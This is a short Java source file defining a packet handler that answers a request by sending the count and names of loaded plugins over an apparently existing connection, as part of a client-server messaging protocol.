package com.redpois0n.packets;

import com.redpois0n.Connection;
import com.redpois0n.Plugin;

public class PacketLOADPLUGINS extends AbstractPacket {

	@Override
	public void read(String line) throws Exception {
		PacketBuilder packet = new PacketBuilder(Header.PLUGINS);

		packet.add(Plugin.list.size());
		
		for (Plugin p : Plugin.list) {
			packet.add(p.name);
		}
		
		Connection.addToSendQueue(packet);
	}

}
